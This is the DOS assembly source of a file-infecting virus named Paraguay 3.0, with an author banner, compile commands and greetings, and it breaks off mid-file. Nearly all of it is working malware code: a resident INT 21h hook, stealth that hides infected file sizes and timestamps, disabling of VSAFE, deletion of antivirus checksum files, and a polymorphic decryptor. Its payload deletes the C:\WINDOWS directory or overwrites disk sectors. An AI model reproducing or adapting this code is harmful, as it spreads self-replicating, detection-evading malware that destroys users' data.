   ; Comment #
   ;
   ;          ßÛßßßßßÜ      ßÜ   Üß Ü ÜÜÜÜ Ü  Ü  Üßßß
   ;           Û     Û        Û Û   Û  ÛÜß Û  Û  ßßÛ
   ;           Û     Û         ß    ß  Û Û  ßß  ßßß
   ;           ÛÜÜÜÜÜß ÜÜÜ   Ü ÜÜ ÜÜÜ    ß   Ü    Ü ÜÜÜ  Ü   Ü
   ;           Û          Û  Ûß      Û  ÜßßßÜ Û  Û     Û Û   Û
   ;           Û       ÜßßÛ  Û    ÜßßÛ  Û   Û Û  Û  ÜßßÛ  ßÜÜÛ
   ;          ÜÛÜ      ßÜÜÛÜ Û    ßÜÜÛÜ ßÜÜÜÛ ßÜÜß  ßÜÜÛÜ    Û    ßßÜ   ÜßßÜ
   ;                                        Û                Û     ßÜ   Û  Û
   ;                                     ßÜÜß             ßÜÜß    ßß  ß  ßß
   ;
   ;  ÄÄÄÄÄÄÄÄÄ Ä Ä ú Coded by Int13h in Paraguay, South America ú Ä Ä ÄÄÄÄÄÄÄÄÄ
   ;
   ; Characteristics
   ; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ; * Appending COM/EXE infector. COMs > 666 and < 60000 bytes
   ; * Resident using Memory Control Block (MCB), hooks INT 21h.
   ; * Fast infector. Infects on open, execution, rename, extended
   ;   open and get/change attributes.
   ; * Doesn't reinfect memory or files.
   ; * Directory and Handle stealth. Hides virus-size on ah=11h/12h/4eh/4fh.
   ; * Turns off VSAFE's flags while analyzing or infecting files. When the
   ;   dirty work is finished, the flags are returned, except of the 'Write
   ;   Protect' one, coz caches may make troubles.
   ; * Time Stealth (AX=5700h and 5701h), returns correct seconds and prevents
   ;   any program from setting normal seconds to an infected file.
   ; * Handler Stealth (AX=2521H and 3521H), returns previous handler for
   ;   INT 21h when someone requests it, and when any program wants to get
   ;   control over INT 21h, it sets it as second handler, this way, the
   ;   virus is always first at INT 21h.
   ; * Gets INT 21h vector tracing the Progam Segment Prefix (PSP), and if it
   ;   finds it, it uses this one, otherwise it uses INT 21h normally.
   ; * Deactivates trap flag and INT 01h, in order to avoid tunneling on any
   ;   int we hook.
   ; * On May (Paraguayan's independence day), if we get a random byte over
   ;   200, the virus dels every file and subdirectories on stinky and filthy
   ;   C:\WINDOWS, setting it as an alternative entrance to DOS (from old
   ;   CP/M).
   ; * It dels ANTI-VIR.DAT, CHKLIST.CPS, CHKLIST.MS and AVP.CRC in the dir
   ;   where files are infected.
   ; * Files infected are set to 60 seconds.
   ; * Doesn't infect files ended with AN,AV,OT,RD,RU,IT,VP,SK,IP,RJ,AR,HA
   ;   so we dont have probs with suckers. Whenever it detects an execution
   ;   of any file with these endings, it deactivates stealth. Then there
   ;   are no problems with compressing programs (pkzIP, aRJ, rAR, lHA) and
   ;   various AV's. Whenever the program terminates its execution
   ;   (AH=4Ch/int 21h or INT 20h) it reactivates stealth.
   ; * Sets its own code for handling Errors.
   ; * Avoids infecting immunized files (CPAV) and DOS 7.0 .COM's.
   ; * There's no viral activity if Novell Network is detected.
   ; * It doesn't infect WINSLOWS .EXE files.
   ; * It doesn't infect with a different length from that specified on the
   ;   header (overlayed .EXE's).
   ; * Maintains Date + Time (sets seconds to 60 ;-).
   ; * Returning control to .COM tries to infect COMMAND.COM.
   ;   Returning contorl to .EXE verifies the payload condition.
   ; * Opens files in 'Read Only' mode, and manipulates the System File Table to
   ;   change to 'Read/Write' mode, save attribs and set them to normal. It also
   ;   resets the pointer.
   ; * Kinda polymorphic, with random regs selection and garbage
   ;   adding in the decryptor. The opcodes table changes on each infection.
   ;
   ;
   ; Ä TO COMPILE IT                ( I TASM, so I am )
   ;  * tasm parag-30.asm /m3
   ;  * tlink parag-30.obj
   ;
   ;    Greetz - Greetz - Greetz - Greetz - Greetz - Greetz - Greetz - Greetz
   ;
   ;    Methyl        : hello prince of tunneling!
   ;    Superx        : a mov ax,04202h takes in your code just a nibble :)
   ;    Tcp           : your disassemblies rock
   ;    Mister Sandman: Metallica rulesss X-DDDD
   ;    Sepultura     : come back to da scene, mate.
   ;    GriYo         : disinfection-on-the-fly equ desinfectar-a-la-mosca ;-)
   ;    Jacky Qwerty  : you can infect even a particle acelerator :)
   ;    Drako [DAN]   : holas. mino@iia2.org no funciona :-( Saludos!
   ;
   ; Also greetz to the gods: Vyvojar, F3161, Neurobasher, Masud & Dark Avenger.
   ;
   ; #

   .Model Tiny
   .Code                                   ; .Pseudocode would be better hehehe
   Org 0h                                  ; Yes, yes, yes; It's an EXE


   Longitud    equ  (offset FakeHoste-offset Paraguay)
   Largor      equ  (offset Omega-Offset Paraguay)
   VirusEnPara equ  (Largor+15)/16
   Saltarlos   equ  (offset Jeroglifico-offset Paraguay)
   Cripted     equ  ((offset Omega-offset Jeroglifico)/2)
   ParraVir1   equ  ((Longitud+15)/16)+1
   ParraVir2   equ  ((Longitud+15)/16)

   Paraguay:
           db 18 dup (090h)                ; Buffer
           call Paso1                      ; Delta Offset
   Paso1:  nop
           pop bp
   Paso2:  sub bp,offset Paso1             ; In BP goes delta (variable)
   Junk02: db 8 dup (090h)                 ; In all labels Junk, garbage.
   Paso3:  mov bp,bp                       ; Used registers are selected
   Junk03: db 4 dup (090h)                 ; randomly by the rnd code.
           push cs                         ; DS:=CS
           pop ds
   Junk04: db 12 dup (090h)
   Paso4:  lea si,[bp+offset Jeroglifico]  ; Index Register is variable
   Junk05: db 6 dup (090h)
   Paso5:  db 081h,0c6h,0,0                ; ADD SI,0000
   Junk06: db 10 dup (090h)
   Paso6:  push si                         ; Stack return address
   Junk07: db 4 dup (090h)                 ; so RET jumps there.
   Paso7:  mov cx,Cripted/2                ; CX value is divided
   Junk08: db 8 dup (090h)
   Paso8:  add cx,Cripted/2
   Junk09: db 6 dup (090h)


   Desencriptor:                           ; Hence the decryptor #:)
   Paso9:  db 081h,034h                    ; XOR WORD PTR [SI],CLAVE
     Clave dw 0
   Junk10: db 14 dup (090h)
   Paso10: inc si                          ; It may be SI,DI or BX
           inc si
   Junk11: db 4 dup (090h)                 ; Waste, waste, waste...
           Loop Desencriptor
   Junk12: db 8 dup (090h)
           ret                             ; Jumps into decryted or RETurns.
   Junk13: db 16 dup (090h)                ; It's needless, but just i put it.

   Jeroglifico:                            ; Encrypted Virus
           push es                         ; Replace DS, in case it is an EXE
           pop ds                          ; DS:=ES
           mov ah,2                        ; TBCLEAN intended.
           int 16h

           mov ax,0db00h                   ; Verify whether NETX.EXE
           int 21h                         ; from Novell Network is
           or al,al                        ; resident.
           jz NoHayNovell
           jmp MemoriaYaPodrida            ; If Novell's there, dont infect.

   NoHayNovell:
           mov ax,0cd13h                   ; Hell Good Interruption! ;)
           int 21h
           cmp ax,013cdh                   ; Residency test.
           jne Instalar                    ; Load virus into memory.
           jmp MemoriaYaPodrida

   Instalar:                               ; Reserve room in
           push es                         ; "R.A.M." Hotel :)
           mov ax,3521h                    ; Old INT 21h handler.
           int 21h
           mov cs:[bp+word ptr Abuela21h],bx
           mov cs:[bp+word ptr Abuela21h+2],es
           mov cs:[bp+word ptr Real21h],bx ; In case PSP tracing fails.
           mov cs:[bp+word ptr Real21h+2],es

           mov ax,3520h                    ; Old INT 20h handler.
           int 21h
           mov cs:[bp+word ptr Interrupcion20h],bx
           mov cs:[bp+word ptr Interrupcion20h+2],es
           push ds                         ; Data Segment to stack

           lds bx,ds:[0006h]               ; Search for original INT 21h
   Tracear:cmp byte ptr ds:[bx],0eah       ; handler in PSP.
           jne Chekear                     ; Thanks Satan's Little Helper
           lds bx,ds:[bx+1]
           cmp word ptr ds:[bx],9090h      ; Search for double NOP
           jnz Tracear
           sub bx,32h
           cmp word ptr ds:[bx],9090h      ;    "   "   "    "
           jne Chekear
   Hallado:mov cs:[bp+word ptr Real21h],bx ; Save found address
           mov cs:[bp+word ptr Real21h+2],ds
           jmp short MCBTSR
   Chekear:cmp word ptr ds:[bx],2e1eh
           jnz MCBTSR
           add bx,25h
           cmp word ptr ds:[bx],80fah
           je Hallado


   MCBTSR: pop ds                          ; Unload Data Segment from stack
           mov ax,ds                       ; Get resident using
           dec ax                          ; <----- MCB
           mov es,ax
           mov ax,es:[3]                   ; Memory
           sub ax,ParraVir1                ; Substract virus length
           xchg bx,ax                      ; in paragraphs (16 bytes)
           push ds                         ; ES:=DS
           pop es
           mov ah,4ah                      ; Free unused memory
           int 21h

           mov ah,48h                      ; Allocate memory
           mov bx,ParraVir2
           int 21h

           dec ax
           mov es,ax
           mov word ptr es:[1],8           ; Virus? Nope... its DOS ;)
           mov word ptr es:[8],'PY'        ; Block's name: PY (Paraguay)
           inc ax
           mov es,ax
           xor di,di

           push cs                         ; Copy virus to free segment
           pop ds
           lea si,[bp+offset Paraguay]     ; From the begining
           mov cx,Longitud                 ; CX bytes
           rep movsb

           int 03h                         ; 4 DEBUG!

           xor ax,ax
           mov ds,ax                       ; DS:=0
           mov dx,offset Maldita21h        ; Gets INT 21h directly
           mov word ptr ds:[21h*4],dx      ; modifying the IVT
           mov ds:[21h*4+2],es

           mov dx,offset Inty20h           ; Gets INT 20h
           mov word ptr ds:[20h*4],dx
           mov ds:[20h*4+2],es
           pop es                          ; Extra Segment saved

   MemoriaYaPodrida:
           cmp byte ptr [bp+ComOexe],'C'   ; What are we infecting?
           je CorrerCOM

           mov ah,2ah                      ; System's date.
           int 21h

           cmp dh,05                       ; Independence month!!
           jne SigaNomas

           in ax,40h                       ; Trivial Randomic Generator.
           cmp al,200d
           jb SigaNomas

           push cs                         ; DS:=CS
           pop ds

           mov ah,03bh
           lea dx,[bp+Offset WindoSucks]   ; Enter the directory
           int 21h
           jc LittleDamage                 ; Error Hmmm Lets fuck it anyway! ;)

           lea ax,[bp+offset ImprimirCadena]
           push ax                         ; Stack Return Address
           push cs                         ; Our Code Segment
           pushf                           ; And the flags
           mov cl,13h                      ; Delete using FCB (Function in cl)
           lea dx,[bp+offset FCBTrucho]    ; The diabolic table
           sub ax,ax                       ; 0 Segment
           push ax
           mov ax,00c0h                    ; Offset 0c0h = alternative entrance
           push ax
           retf                            ; Jmp there!

   LittleDamage:
           in ax,40h
           xchg dx,ax
           xor dh,dh                       ; Just between the first 0xff sectores
           mov al,2                        ; Drive C:
           mov cx,2                        ; Smashs two random sectors
           int 26h

   ImprimirCadena:                         ; Social Presentation
           push cs
           pop ds
           mov ah,9                        ; Print Copyright
           lea dx,[bp+offset CopyWrong]
           int 21h

           xor ax,ax                       ; It even pauses! :)
           int 16h

   SigaNomas:
           push es                         ; Correct Data Segment
           pop ds

           mov bx,bp                       ; F-Prot's guilty for this

           mov ax,es
           add ax,10h                      ; Because of the PSP
           add cs:[(bx+CS_IP)+2],ax

           cli                             ; Stop ints
           add ax,cs:[(bx+SS_SP)+2]
           mov ss,ax                       ; Its stack segment
           mov sp,cs:[bx+SS_SP]            ; and its stack pointer
           sti                             ; Free ints

           call Limpiar                    ; Reinitialize registries

           db 0ebh,0h                      ; Free the prefetch queue
           db 0eah                         ; Jump to EXE's CS:IP
           CS_IP dw offset FakeHoste,0h
           SS_SP dw 0,0                    ; Its SS:SP


   CorrerCOM:
           call Segmentos
           mov ah,56h                      ; Rename! Hehe, just to infect
           lea dx,[bp+offset CommandCom]   ; COMMAND.COM, making sure we
           mov di,dx                       ; get on memory early each day in
           int 21h                         ; the morning.

           lea si,[bp+offset Vafer]        ; Its original bytes...
           mov di,100h
           push di                         ; 100h to stack
           cld
           movsb                           ; Return its old bytes.
           movsw

   Limpiar:xor ax,ax
           xor bx,bx
           xor cx,cx                       ; Clean registers
           xor dx,dx
           xor si,si
           xor di,di
           xor bp,bp
           ret                             ; Run COM or return to caller


   Stealth_Segundos2:
           push dx
           push cx                         ; Saves originals
           mov ax,5700h                    ; Get date & time of the given handle
           pushf
           call dword ptr cs:[Real21h]
           and cl,00011111b
           cmp cl,00011110b                ; ¨60 seconds? ¨Infected?
           jne Tranquilopa
           pop cx
           and cl,11100000b                ; Marks as infected
           or cl,00011110b                 ; 30*2=60!
           push cx
   Tranquilopa:
           pop cx
           pop dx
           mov ax,5701h                    ; Set the date & time
           pushf
           call dword ptr cs:[Real21h]
           iret


   Stealth_Segundos1:
           pushf
           call dword ptr cs:[Real21h]     ; Do the real int
           push cx
           and cl,00011111b
           cmp cl,00011110b                ; ¨60 seconds?
           jne NoPasaNada
           pop cx
           and cl,11100000b                ; Erase erronous infect mark
           or cl,1                         ; 1*2=2 seconds
           push cx
   NoPasaNada:
           pop cx
           iret



   Maldito_Jump2:                          ; Worst opcodes are those short
           jmp Stealth2                    ; jumps of 128 bytes! :-(
   Maldito_Jump3:
           jmp Analizar


   ;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
   ;! Maldita21h:  Its the INT 21h handler set by Paraguay 3.0                  !
   ;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
   Maldita21h proc far                     ; My INT 21h
           push ds
           push si
           push ax                         ; Saving the registers I'll use.
           push bx
           pushf
           pop ax                          ; Get flags into AX
           and ah,11111110b                ; Zero out Trap Flag used for
           push ax                         ; tunneling
           popf                            ; And load modified flags from AX
           sub ax,ax
           mov ds,ax                       ; DS:=0     =  IVT
           mov bx,4                        ; 0000:0004 =  Int 1h handler
           lds si,[bx]                     ; DS:SI     =     "     " "
           mov bl,byte ptr [si]            ; Handler's first byte in bl
           mov byte ptr [si],0cfh          ; That is an InterruptionRETurn
           pop bx
           pop ax                          ; Restore registers
           pop si
           pop ds

           cmp ax,0cd13h                   ; Memory Check
           je Chequeo
           cmp ax,03521h                   ; Hide Int21h
           je Ocultar21h_A
           cmp ax,02521h                   ; Protect Int21h
           je Ocultar21h_B
           cmp ax,05700h                   ; Hide wrong secs
           je Stealth_Segundos1
           cmp ax,05701h                   ; Protect wrong secs
           je Stealth_Segundos2
           cmp ah,11h                      ; FCB finding first
           je Stealth1
           cmp ah,12h                      ; FCB finding next
           je Stealth1
           cmp ah,4eh                      ; Finding first
           je Maldito_Jump2
           cmp ah,4fh                      ; Finding next
           je Maldito_Jump2
           cmp ah,04bh                     ; Program execution
           je Maldito_Jump3
           cmp ah,056h                     ; Rename files
           je Maldito_Jump3
           cmp ah,043h                     ; Get/Set attribs
           je Maldito_Jump3
           cmp ah,3dh                      ; Open
           je Maldito_Jump3
           cmp ax,6c00h                    ; Extended Open
           je Maldito_Jump3
           cmp ah,4ch                      ; Program end...
           je SalidaProg
           db 0eah                         ; Normal INT, uninteresting :)
           Abuela21h dw 0,0
   Chequeo:xchg ah,al                      ; Yes!!!! Here we are.
           iret
   Maldita21h endp


   SalidaProg:                             ; Int 21h/4Ch to end the program
           mov byte ptr cs:[HacerStealth],1; Set stealth flag
           jmp dword ptr cs:[Abuela21h]


   Inty20h:                                ; Int 20h ending (4 some old COMs)
           mov byte ptr cs:[HacerStealth],1; Set stealth flag
           db 0eah
           Interrupcion20h dw 0,0


   Ocultar21h_A:
           mov bx,cs:[word ptr Abuela21h]  ; Old handler into ES:BX
           mov es,cs:[word ptr Abuela21h+2]
           iret

   Ocultar21h_B:
           mov cs:[word ptr Abuela21h],dx  ; Set DS:DX as second handler
           mov cs:[word ptr Abuela21h+2],ds; in the chain.
           iret                            ; Viruses first ;)


   ;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
   ;! Stealth1:  Edit File Control Block size to hide the al virus              !
   ;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
   Stealth1:                               ; FCB stealth
           pushf
           call dword ptr cs:[Abuela21h]
           or al,al                        ; al = 0?
           jne ErrorDir                    ; Puaj! Error :-(

           push ax
           push bx                         ; Save this regs into the stack
           push es

           mov ah,62h                      ; PSP: where is it?
           int 21h

           mov es,bx
           cmp bx,es:[16h]                 ; Correct PSP?
           jne Fuera                       ; Nope, chau.

           mov bx,dx                       ; Points to original FCB in the PSP
           mov al,[bx]
           push ax                         ; Save AX for later comparison

           mov ah,2fh                      ; In ES:BX there is DTA's address
           int 21h
           pop ax                          ; Reget AX (AL=ffh or AL=1)
           inc al                          ; Which FCB-type?
           jne FCBComun
           add bx,7                        ; Its extended, turn it normal

   FCBComun:
           mov al,byte ptr es:[bx+17h]     ; True Seconds...
           and al,00011111b
           cmp al,00011110b                ; 60 seconds?
           jne Fuera

           cmp word ptr es:[bx+1dh],(Largor+200)
           ja Sustraer                     ; If greater than virus, substract.

           cmp word ptr es:[bx+1fh],0      ; Too small as to be infected
           je Fuera

   Sustraer:
           sub word ptr es:[bx+1dh],Largor
           sbb word ptr es:[bx+1fh],0000   ; Substract virus size
           or byte ptr es:[bx+17h],1       ; Hide the seconds

   Fuera:  pop es                          ; Pop modified regs
           pop bx
           pop ax
   ErrorDir:
           retf 2                          ; IRET maintaining flags


   ;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
   ;! Stealth2:  Edit Disk Transfer Area size to hide the virus                 !
   ;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
   Stealth2:                               ; Handle stealth
           pushf
           call dword ptr cs:[Abuela21h]
           jc Demonios                     ; If carry is set...ERROR!

           cmp byte ptr cs:[HacerStealth],0; Is stealth off?
           je Demonios

           pushf
           push ax
           push es
           push bx

           mov ah,2fh                      ; DTAddress
           int 21h                         ; in ES:BX

           mov ax,es:[bx+16h]              ; Unhide the seconds
           and al,00011111b
           cmp al,00011110b                ; 60 segundos?
           jne Paso

           cmp word ptr es:[bx+1ah],(Largor+200d)
           jb Paso                         ; Verify size

           sub word ptr es:[bx+1ah],Largor ; Substract virus
           sbb word ptr es:[bx+1ch],0000
           or byte ptr es:[bx+16h],1       ; Hide seconds

   Paso:   pop bx
           pop es
           pop ax
           popf
   Demonios:
           retf 2                          ; RETurn


   ;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
   ;! Manejador24h:  Pseudo-error-handler, so as to avoid write protect errors  !
   ;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
   Manejador24h proc near                  ; Dumb critic error handler
           mov al,03
           iret                            ; -It's nothing, officer...
   Manejador24h endp



   Maldito_Jump4:                          ; 128 byte shit junk
           jmp PopAll

   SoloPopear:
           jmp JustPOPs


   ;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
   ;! Analizar:  Analize and eventual infection of file given in DS:DX          !
   ;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
   Analizar:                               ; Examine victim
           pushf
           push ax
           push bx
           push cx
           push dx
           push si
           push di
           push ds
           push es

           cmp ax,6c00h                    ; Special case DS:SI
           jne No_Apertura_Extendida

           cmp dx,0001                     ; Standard open
           jne SoloPopear

           mov dx,si                       ; Now its DS:DX also

   No_Apertura_Extendida:
           push ax
           push dx                         ; V¡ctim
           push ds

           mov ax,3524h                    ; Int 24h Handler
           int 21h
           mov word ptr cs:[Vieja24h],bx
           mov word ptr cs:[(Vieja24h)+2],es
           push cs
           pop ds

           mov ax,2524h                    ; Pipe it
           mov dx,offset Manejador24h
           int 21h

           mov ax,0fa02h                   ; Turn off VSAFE's flags
           mov dx,5945h                    ;
           mov bl,00000000b                ; New flags = 0
           int 21h
           mov byte ptr cs:[Vsuck],cl      ; Save flags for later

           pop ds                          ; Candidate in DS:DX
           pop dx
           push ds
           pop es
           pop ax
           cld
           mov di,dx
           mov cx,128
           mov al,'.'                      ; Search jumping .
           repne scasb
           jne Maldito_Jump4

           push ax

           mov ax,word ptr es:[di-3]       ; Dont infect undesirable!
           or ax,02020h
           cmp ax,'na'                     ; scAN / cleAN / tbscAN / tbcleAN
           je Actuar
           cmp ax,'va'                     ; tbAV / nAV
           je Actuar
           cmp ax,'to'                     ; fool-prOT
           je Actuar
           cmp ax,'dr'                     ; guaRD
           je Actuar
           cmp ax,'ur'                     ; findviRU
           je Actuar
           cmp ax,'ti'                     ; toolkIT
           je Actuar
           cmp ax,'pv'                     ; aVP
           je Actuar
           cmp ax,'ks'                     ; chkdSK
           je Actuar
           cmp ax,'pi'                     ; pkzIP
           je Actuar
           cmp ax,'jr'                     ; aRJ
           je Actuar
           cmp ax,'ra'                     ; rAR
           je Actuar
           cmp ax,'ah'                     ; lHA
           je Actuar
           pop ax
           jmp short IsNotEvilSoft

   Actuar: pop ax
           cmp ah,04bh                     ; Will junk be exec'ed?
           jne Maldito_Jump5
           mov byte ptr cs:[HacerStealth],0; Turn stealth off
           jmp short Maldito_Jump5

   IsNotEvilSoft:
           xchg si,di                      ; Check ext
           lodsw
           or ax,2020h                     ; Uncapitalize
           cmp ax,'oc'                     ; .CO?
           jne VerEXE3
           lodsb
           or al,20h
           cmp al,'m'                      ; .COM?
           je Label3
   Maldito_Jump5:
           jmp PopAll                      ; Abort mission

   VerEXE3:cmp ax,'xe'                     ; .EX?
           jne Maldito_Jump5
           lodsb
           or al,20h
           cmp al,'e'                      ; .EXE?
           jne Maldito_Jump5

   Label3: mov ax,3d00h                    ; Open host in read-only
           pushf                           ; mode
           call dword ptr cs:[Real21h]
           jc Maldito_Jump5
           xchg bx,ax                      ; Handle into BX
           mov word ptr cs:[Handle],bx

           push cs
           pop ds

           mov ax,4301h                    ; Get ANTI-VIR.DAT attrib naked
           mov dx,offset Basura1
           sub cx,cx
           pushf                           ; Call handler directly
           call dword ptr cs:[Real21h]

           mov ah,41h                      ;
           mov dx,offset Basura1
           int 21h

           mov ah,41h                      ; Chau CHKLIST.MS
           mov dx,offset Basura2
           int 21h

           mov ah,41h                      ; C ya CHKLIST.CPS
           mov dx,offset Basura3
           int 21h

           mov ah,41h                      ; Good luck AVP.CRC
           mov dx,offset Basura4
           int 21h

           mov ax,5700h                    ; Time and Date please
           pushf                           ; Call handler directly
           call dword ptr cs:[Real21h]
           mov word ptr cs:[Time],cx
           mov word ptr cs:[Date],dx
           and cl,00011111b
           cmp cl,00011110b                ; 30*2= ¨60?
           jne Conti                       ; Already infected?
           jmp Maldito_Jump6


   Conti:  call Segmentos                  ; Set working segments
           mov ah,3fh                      ; Read from the beginning
           mov cx,45d                      ; 45 bytes to our buffer
           mov dx,offset Cabecera
           int 21h

           mov si,dx                       ; Is it a True EXE?
           cmp word ptr [si],'ZM'
           je InfectarEXE
           cmp word ptr [si],'MZ'          ; Other way
           je InfectarEXE


   InfectarCOM:                            ; Notice .COM files
           push bx                         ; Save handle
           mov ah,30h
           int 21h
           pop bx                          ; And restore it here ;)
           cmp al,7                        ; Dare not touch the COMs
           jae Maldito_Jump6               ; from DOS 7 or above

           call AlFinal
           cmp ax,60000d                   ; Check size
           ja Maldito_Jump6
           cmp ax,029Ah                    ; Hi there spanish pals ;-)
           jbe Maldito_Jump6

           cmp word ptr [si+11d],'TW'      ; CPAV immunized?
           je Maldito_Jump6

           mov byte ptr [COMoEXE],'C'      ; Mark as .COM
           mov di,offset Vafer             ; which we will write into 100h after
           movsb
           movsw

           sub ax,3                        ; JMP
           mov word ptr [Salto+1],ax

           call HIPOCRESIA                 ; Change the face. HIPOCRITE! ;)

           mov bx,[Handle]                 ; Handle in BX

           call Manipular_SFT              ; Modify SFT info

           mov ah,40h
           mov cx,Largor
           mov dx,offset CopiaVir
           int 21h                         ; ADD file,virus

           mov word ptr es:[di+015h],00    ; Pointer to the beginning SFT
           mov word ptr es:[di+017h],00

           mov ah,40h                      ; Write the JMP
           mov cx,3
           mov dx,offset Salto
           int 21h

           inc word ptr [Contador]         ; One more ;)

           mov cl,byte ptr [Atributos]     ; Return its original attribs
           mov byte ptr es:[di+4],cl

           call PongoFecha                 ; Restore date and time
   Maldito_Jump6:
           jmp Cerrar                      ; Close and go


   InfectarEXE:                            ; Notice .EXE
           cmp word ptr [si+018h],0040h    ; If Windoze let it rot
           jae Maldito_Jump6

           cmp word ptr [si+01ah],0000     ; Overlay?
           jne Maldito_Jump6

           cmp word ptr [si+43d],'TW'      ; Sucked with CPAV's code?
           je Maldito_Jump6

           call AlFinal

           mov cx,512d                     ; See if not overlayed
           div cx
           or dx,dx                        ; Is multiple?
           je NoHayResto
           inc ax
   NoHayResto:
           cmp word ptr [si+02h],dx        ; Do partial page bytes match?
           jne Maldito_Jump6
           cmp word ptr [si+04h],ax        ; Total page bytes match
           jne Maldito_Jump6               ; real size?

           mov byte ptr [COMoEXE],'E'      ; EXE marked
           call AlFinal
           push dx                         ; Size
           push ax

           les ax,dword ptr [(Cabecera+014h)]
           mov [CS_IP],ax                  ; The world-wide known CS:IP and the
           mov [(CS_IP+2)],es              ; not less well-known SS:SP
           les ax,dword ptr [(Cabecera+0eh)]
           mov word ptr [SS_SP],es         ; CS:IP (Intel Reversed Word Format)
           mov word ptr [(SS_SP+2)],ax     ; SS:SP (Non "      "     "    "   )

           mov ax,word ptr [(Cabecera+08h)]
           mov cl,4
           shl ax,cl
           xchg bx,ax
           pop ax                          ; Pop size
           pop dx
           push ax
           push dx                         ; Repush
           sub ax,bx
           sbb dx,0
           mov cx,10h
           div cx                          ; Turn into segmented style
           mov word ptr [(Cabecera+014h)],dx
           mov word ptr [(Cabecera+016h)],ax
           mov word ptr [(Cabecera+0eh)],ax
           mov word ptr [(Cabecera+010h)],0

           pop dx                          ; Pop size one more time
           pop ax

           add ax,Largor                   ; Host+Virus size
           adc dx,0
           mov cl,9
           push ax
           shr ax,cl
           ror dx,cl
           or dx,dx                        ; Garbage
           stc
           adc dx,ax
           pop ax
           and ah,1
           mov word ptr [(Cabecera+4)],dx
           mov word ptr [(Cabecera+2)],ax

           mov ax,word ptr [(Cabecera+0ah)]; MinAlloc
           clc
           add ax,VirusEnPara
           jc NoAgregarMemoria             ; If carry dont add
           mov word ptr [(Cabecera+0ah)],ax
   NoAgregarMemoria:                       ; MaxAlloc, underneath
           mov word ptr [(Cabecera+0ch)],0ffffh

           call HIPOCRESIA                 ; Change yer face. HIPOCRITE!

           mov bx,[Handle]

           call Manipular_SFT

           mov ah,40h
           mov cx,Largor                   ; Stack virus at the end
           mov dx,offset CopiaVir
           int 21h

           mov word ptr es:[di+015h],00    ; Set pointer to start simply by
           mov word ptr es:[di+017h],00    ; resetting the pos set in SFT

           mov ah,40h                      ; Write header at the beginning
           mov cx,01ah
           mov dx,offset Cabecera
           int 21h

           inc word ptr [Contador]         ; Another one for the list

           mov cl,byte ptr [Atributos]     ; Return Original Attribs
           mov byte ptr es:[di+4],cl

           call PongoFecha                 ; Restore Date and Time set

   Cerrar: mov ah,3eh                      ; Close file
           int 21h

   PopAll: push cs
           pop ds

           mov ds,word ptr [Vieja24h+2]
           mov dx,cs:word ptr [offset Vieja24h]
           mov ax,2524h
           int 21h                         ; Restore Error Handler

           mov ax,0fa02h                   ; Before ending, clean tracks
           mov dx,5945h                    ; Restore VSAFE's flags
           mov bl,byte ptr cs:[Vsuck]
           and bl,11111011b                ; Turn off write-protected flag
           int 21h                         ; (cache stuff)

   JustPOPs:
           pop es                          ; Pop all regs
           pop ds                          ;
           pop di
           pop si
           pop dx
           pop cx
           pop bx
           pop ax
           popf
           jmp dword ptr cs:[Abuela21h]



   Contador   dw  0                        ; Infection counter
   CopyWrong  db 'VIRUS PARAGUAY Ver. 3.0!$ Programmed by Int13h,'
              db ' in Paraguay, South America.'

   Basura1    db 'ANTI-VIR.DAT',0          ; Computer disgraces
   Basura2    db 'CHKLIST.MS',0
   Basura3    db 'CHKLIST.CPS',0
   Basura4    db 'AVP.CRC',0
   CommandCom db 'C:\COMMAND.COM',0        ; To infect this sucker
   WindoSucks db 'C:\WINDOWS',0            ; I'm about to vomit! Puuuaaaaj!!
   Salto      db 0e9h,00h,00h              ; Initial jump at beginning of COM
   Vafer      db 090h,0cdh,020h            ; The three original COM bytes
   Cinco      db 5                         ; So as to randomize decryptor's CX
   ComOexe    db 'E'                       ; The mark
   FCBTrucho  db 0ffh                      ; The FCB table to delete
              db 5 dup(0)                  ; WINDOWS dir
              db 1fh                       ; with all its files and subdirs
              db 3                         ; no matter their attribs.
              db '???????????'
              db 19h dup(0)
              Real21h dw 0,0               ; Real 21h handler



   ;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
   ;! Manipular_SFT: Modify opening mode of file and save/change attribs        !
   ;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
   Manipular_SFT:
           push bx
           mov ax,1220h                    ; Get Job System Table
           int 2fh                         ; in ES:DI

           mov ax,1216h                    ; Now the File System Table
           xor bh,bh                       ; for our handle in ES:DI
           mov bl,es:[di]
           int 2fh

           mov cl,byte ptr es:[di+4]       ; Manipulate SFT
           mov byte ptr [Atributos],cl     ; Get attribs
           mov byte ptr es:[di+4],20h      ; Attrib = 20h = file
           mov byte ptr es:[di+2],2        ; Read/write access
           pop bx
           ret



   Maldito_Jump7:                          ; Must I say something about
             jmp Muto7                     ; 128 byte-jumps still??? :)
   Maldito_Jump8:
